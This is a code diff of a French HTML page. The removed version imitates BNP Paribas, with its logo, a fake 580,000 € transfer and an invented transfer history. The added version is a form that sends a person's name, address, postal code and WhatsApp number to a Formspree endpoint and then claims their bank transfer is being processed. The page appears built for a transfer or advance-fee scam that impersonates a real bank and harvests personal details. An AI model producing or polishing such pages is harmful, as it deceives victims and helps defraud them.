@@ -1,148 +1,101 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Virement BNP Paribas</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Formulaire de Virement</title>
   <style>
     body {
       font-family: Arial, sans-serif;
-      background-color: #f3f4f6;
-      margin: 0;
-      padding: 0;
-    }
-    header {
-      background-color: #007846;
-      color: white;
       padding: 20px;
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
+      background: #f1f1f1;
     }
-    header img {
-      height: 50px;
-    }
-    nav a {
-      color: white;
-      margin-left: 20px;
-      text-decoration: none;
-      font-weight: bold;
-    }
-    main {
-      padding: 20px;
-    }
-    .formulaire {
-      background-color: white;
+    #form-container, #confirmation {
+      background: white;
       padding: 20px;
       border-radius: 8px;
-      box-shadow: 0 0 10px #ccc;
-      max-width: 600px;
-      margin: 0 auto 30px auto;
+      max-width: 400px;
+      margin: auto;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
     }
-    .formulaire input, .formulaire select {
+    input {
       width: 100%;
       padding: 10px;
       margin-top: 10px;
+      margin-bottom: 20px;
       border: 1px solid #ccc;
-      border-radius: 5px;
+      border-radius: 4px;
     }
-    .formulaire button {
-      background-color: #007846;
+    button {
+      padding: 10px 15px;
+      background-color: #007bff;
       color: white;
-      padding: 12px;
       border: none;
-      border-radius: 5px;
-      margin-top: 15px;
-      width: 100%;
-      font-size: 16px;
+      border-radius: 4px;
+      cursor: pointer;
     }
-    table {
-      width: 100%;
-      background-color: white;
-      border-collapse: collapse;
-      box-shadow: 0 0 10px #ccc;
-      margin-bottom: 30px;
+    button:hover {
+      background-color: #0056b3;
     }
-    table th, table td {
-      padding: 15px;
-      border-bottom: 1px solid #ddd;
-    }
-    table th {
-      background-color: #007846;
-      color: white;
-      text-align: left;
-    }
-    footer {
-      background-color: #004d2d;
-      color: white;
+    #confirmation {
+      display: none;
       text-align: center;
-      padding: 20px;
     }
   </style>
 </head>
 <body>
-  <header>
-    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/bf/BNP_Paribas.svg/2560px-BNP_Paribas.svg.png" alt="BNP Logo">
-    <nav>
-      <a href="#">Accueil</a>
-      <a href="#">Aide</a>
-      <a href="#">Contact</a>
-    </nav>
-  </header>
 
-  <main>
-    <section class="formulaire">
-      <h2>Formulaire de Virement</h2>
-      <form>
-        <label>Nom du titulaire</label>
-        <input type="text" value="Monsieur Dupont" readonly />
+  <h2 style="text-align:center;">Formulaire de coordonnées</h2>
 
-        <label>IBAN</label>
-        <input type="text" value="FR76 3000 4000 0500 0001 2345 678" readonly />
+  <div id="form-container">
+    <form id="contactForm" action="https://formspree.io/f/abcde123" method="POST">
+      <label for="nom">Nom complet</label>
+      <input type="text" id="nom" name="nom" required>
 
-        <label>Montant (€)</label>
-        <input type="text" value="580000" readonly />
+      <label for="adresse">Adresse</label>
+      <input type="text" id="adresse" name="adresse" required>
 
-        <label>Bénéficiaire</label>
-        <select>
-          <option>Entreprise A</option>
-          <option>Fournisseur B</option>
-          <option>Consultant C</option>
-        </select>
+      <label for="codepostal">Code postal</label>
+      <input type="text" id="codepostal" name="codepostal" required>
 
-        <button type="submit">Valider le virement</button>
-      </form>
-    </section>
+      <label for="whatsapp">Numéro WhatsApp</label>
+      <input type="tel" id="whatsapp" name="whatsapp" required>
 
-    <section>
-      <h2>Historique des Virements</h2>
-      <table>
-        <tr>
-          <th>Date</th>
-          <th>Destinataire</th>
-          <th>Montant</th>
-        </tr>
-        <tr>
-          <td>15/05/2025</td>
-          <td>Entreprise A</td>
-          <td>580.000 €</td>
-        </tr>
-        <tr>
-          <td>10/05/2025</td>
-          <td>Consultant C</td>
-          <td>120.000 €</td>
-        </tr>
-        <tr>
-          <td>01/05/2025</td>
-          <td>Fournisseur B</td>
-          <td>90.000 €</td>
-        </tr>
-      </table>
-    </section>
-  </main>
+      <button type="submit">Envoyer</button>
+    </form>
+  </div>
 
-  <footer>
-    &copy; 2025 BNP Paribas. Tous droits réservés.
-  </footer>
+  <div id="confirmation">
+    <h3>Merci !</h3>
+    <p>Votre virement bancaire est en cours de traitement.</p>
+    <p>Vous serez contacté par WhatsApp très bientôt.</p>
+  </div>
+
+  <script>
+    document.getElementById('contactForm').addEventListener('submit', function(e) {
+      e.preventDefault(); // Empêche l'envoi immédiat
+      const form = e.target;
+
+      // Envoi via Formspree
+      fetch(form.action, {
+        method: form.method,
+        body: new FormData(form),
+        headers: {
+          'Accept': 'application/json'
+        }
+      }).then(response => {
+        if (response.ok) {
+          form.reset();
+          document.getElementById('form-container').style.display = 'none';
+          document.getElementById('confirmation').style.display = 'block';
+        } else {
+          alert('Erreur : Veuillez réessayer.');
+        }
+      }).catch(error => {
+        alert('Erreur réseau. Veuillez vérifier votre connexion.');
+      });
+    });
+  </script>
+
 </body>
 </html>
